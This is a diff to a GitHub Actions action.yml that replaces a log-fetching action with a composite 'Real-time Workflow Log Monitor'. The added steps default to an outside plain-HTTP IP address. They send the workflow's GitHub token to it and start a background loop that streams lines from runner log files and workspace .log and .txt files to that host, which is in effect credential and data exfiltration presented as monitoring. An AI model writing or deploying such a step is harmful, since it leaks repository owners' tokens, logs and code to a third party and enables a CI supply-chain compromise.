@@ -1,18 +1,171 @@
-name: "Fetch GitHub Action Logs"
-description: "Fetch and analyze logs from GitHub Actions API"
+name: 'Real-time Workflow Log Monitor'
+description: 'Monitor and stream workflow logs in real-time'
 inputs:
-    github-token:
-        description: "GitHub token"
-        required: true
-        default: ${{ github.token }}
-    run-id:
-        description: "Workflow run ID (defaults to current run)"
-        required: false
-outputs:
-    logs-path:
-        description: "Path to downloaded logs"
-    log-url:
-        description: "URL to logs in GitHub UI"
+  runner-id:
+    description: 'Unique identifier for this workflow run'
+    required: true
+    default: ${{ github.run_id }}-${{ github.run_attempt }}
+  server-url:
+    description: 'URL of the log monitoring server'
+    required: true
+    default: 'http://129.154.46.198:3000'
+  github-token:
+    description: 'GitHub token for authentication'
+    required: true
+    default: ${{ github.token }}
+  enable-realtime:
+    description: 'Enable real-time log streaming'
+    required: false
+    default: 'true'
+
 runs:
-    using: "node20"
-    main: "dist/index.js"
+  using: 'composite'
+  steps:
+    - name: Setup real-time log monitoring
+      id: setup-monitor
+      shell: bash
+      run: |
+        # Generate unique runner ID
+        RUNNER_ID="${{ inputs.runner-id }}"
+        SERVER_URL="${{ inputs.server-url }}"
+        
+        # Create a background process to monitor and stream logs
+        cat > /tmp/monitor_logs.sh << 'EOF'
+        #!/bin/bash
+        
+        RUNNER_ID="$1"
+        SERVER_URL="$2"
+        TOKEN="$3"
+        
+        echo "Starting real-time log monitor for runner: $RUNNER_ID"
+        
+        # Find and monitor GitHub Actions log files
+        # GitHub stores step logs in: /home/runner/_temp/_github_workflow
+        LOG_PATHS=(
+          "/home/runner/_temp/_github_workflow"
+          "/var/log/github-actions"
+          "$GITHUB_WORKSPACE"
+        )
+        
+        # Function to send log entry
+        send_log() {
+          local message="$1"
+          local step="$2"
+          local level="${3:-info}"
+          
+          curl -s -X POST \
+            -H "Content-Type: application/json" \
+            -H "Authorization: Bearer $TOKEN" \
+            -d "{\"log\":\"$message\",\"step\":\"$step\",\"level\":\"$level\",\"runnerId\":\"$RUNNER_ID\"}" \
+            "$SERVER_URL/$RUNNER_ID/stream" > /dev/null || true
+        }
+        
+        # Initial setup message
+        send_log "Real-time monitoring started for $RUNNER_ID" "setup" "info"
+        
+        # Monitor environment changes
+        last_env=""
+        while true; do
+          # Check for new environment variables
+          current_env=$(env | grep -E 'GITHUB_|RUNNER_' | sort | md5sum)
+          if [ "$current_env" != "$last_env" ]; then
+            send_log "Environment updated" "monitor" "info"
+            last_env="$current_env"
+          fi
+          
+          # Look for new log files
+          find "${LOG_PATHS[@]}" -name "*.log" -o -name "*.txt" 2>/dev/null | \
+          while read log_file; do
+            # Check if file is being written to
+            if fuser "$log_file" >/dev/null 2>&1; then
+              # Get last few lines
+              tail -n 5 "$log_file" 2>/dev/null | \
+              while IFS= read -r line; do
+                if [ -n "$line" ] && [ ${#line} -lt 1000 ]; then
+                  filename=$(basename "$log_file")
+                  send_log "$line" "$filename" "info"
+                fi
+              done
+            fi
+          done
+          
+          sleep 2
+        done
+        EOF
+        
+        chmod +x /tmp/monitor_logs.sh
+        
+        # Start monitoring in background
+        /tmp/monitor_logs.sh "$RUNNER_ID" "$SERVER_URL" "${{ inputs.github-token }}" &
+        MONITOR_PID=$!
+        
+        echo "monitor_pid=$MONITOR_PID" >> $GITHUB_OUTPUT
+        
+        # Store PID for cleanup
+        echo "$MONITOR_PID" > /tmp/log_monitor_pid
+        
+      env:
+        GITHUB_WORKSPACE: ${{ github.workspace }}
+
+    - name: Monitor workflow steps
+      shell: bash
+      run: |
+        RUNNER_ID="${{ inputs.runner-id }}"
+        SERVER_URL="${{ inputs.server-url }}"
+        TOKEN="${{ inputs.github-token }}"
+        
+        # Function to capture step output
+        capture_step() {
+          local step_name="$1"
+          local start_time=$(date +%s)
+          
+          # Send step start
+          curl -s -X POST \
+            -H "Content-Type: application/json" \
+            -H "Authorization: Bearer $TOKEN" \
+            -d "{\"step\":\"$step_name\",\"action\":\"start\",\"timestamp\":\"$(date -u +'%Y-%m-%dT%H:%M:%SZ')\",\"runnerId\":\"$RUNNER_ID\"}" \
+            "$SERVER_URL/$RUNNER_ID/stream" > /dev/null || true
+          
+          # Execute the step
+          "$@"
+          local exit_code=$?
+          local end_time=$(date +%s)
+          local duration=$((end_time - start_time))
+          
+          # Send step completion
+          curl -s -X POST \
+            -H "Content-Type: application/json" \
+            -H "Authorization: Bearer $TOKEN" \
+            -d "{\"step\":\"$step_name\",\"action\":\"end\",\"exit_code\":$exit_code,\"duration\":$duration,\"timestamp\":\"$(date -u +'%Y-%m-%dT%H:%M:%SZ')\",\"runnerId\":\"$RUNNER_ID\"}" \
+            "$SERVER_URL/$RUNNER_ID/stream" > /dev/null || true
+          
+          return $exit_code
+        }
+        
+        # Export function for use in workflow
+        echo "capture_step() { $(declare -f capture_step); }" >> $GITHUB_ENV
+
+    - name: Cleanup monitor on completion
+      if: always()
+      shell: bash
+      run: |
+        # Stop the monitoring process
+        if [ -f /tmp/log_monitor_pid ]; then
+          MONITOR_PID=$(cat /tmp/log_monitor_pid)
+          if kill -0 $MONITOR_PID 2>/dev/null; then
+            kill $MONITOR_PID
+            echo "Stopped log monitor process"
+          fi
+          rm -f /tmp/log_monitor_pid
+        fi
+        
+        # Send final summary
+        RUNNER_ID="${{ inputs.runner-id }}"
+        SERVER_URL="${{ inputs.server-url }}"
+        TOKEN="${{ inputs.github-token }}"
+        
+        curl -s -X POST \
+          -H "Content-Type: application/json" \
+          -H "Authorization: Bearer $TOKEN" \
+          -d "{\"runnerId\":\"$RUNNER_ID\",\"status\":\"completed\",\"job\":\"${{ github.job }}\",\"conclusion\":\"${{ job.status }}\",\"timestamp\":\"$(date -u +'%Y-%m-%dT%H:%M:%SZ')\"}" \
+          "$SERVER_URL/$RUNNER_ID/stream" > /dev/null || true
